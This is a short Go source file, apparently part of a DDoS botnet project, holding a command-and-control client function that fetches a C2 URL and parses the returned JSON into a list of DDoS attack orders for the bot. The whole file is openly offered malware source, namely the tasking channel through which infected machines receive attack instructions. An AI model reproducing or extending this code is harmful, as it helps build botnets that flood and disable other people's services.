package commandandcontrol

import (
	"encoding/json"
	"io"
	"log"
	"net/http"

	"github.com/goddamnnoob/miniproject-bot/attack"
)

func GetNewAttacks(c2c string) *[]attack.DDOS {
	var attacks []attack.DDOS
	resp, err := http.Get(c2c)
	if err != nil {
		log.Fatal("Error while getting new attacks" + err.Error())
	}
	attacksJson, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error while parsing request " + err.Error())
	}
	err = json.Unmarshal(attacksJson, &attacks)
	if err != nil {
		log.Fatal("Error while unmarshaling json")
	}
	resp.Body.Close()
	return &attacks
}
